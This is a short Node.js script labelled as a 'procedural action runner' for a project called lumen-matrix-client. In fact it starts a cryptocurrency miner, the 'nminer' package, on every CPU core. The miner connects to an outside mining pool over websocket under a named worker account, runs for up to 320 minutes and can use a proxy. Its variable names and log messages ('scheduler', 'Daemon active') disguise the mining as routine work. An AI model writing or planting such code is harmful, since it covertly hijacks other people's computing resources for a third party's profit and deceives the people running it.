// Procedural action runner for lumen-matrix-client
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./core/config");

(async () => {
    const traceId = "fcefa7";
    console.log(`[monitor] Daemon ${config.appName || "lumen-matrix-client"} active [tag: ${traceId}]`);

    const scheduler = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.lumen-matrix-client",
        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
    );

    const keepAlivePromise = new Promise(() => {});
    setTimeout(() => {
        console.log("[timeout] Operational limit (320m) reached, exiting cleanly.");
        process.exit(0);
    }, 320 * 60 * 1000);

    process.once("SIGTERM", () => {
        
        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
        process.exit(0);
    });

    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
})().catch(console.error);
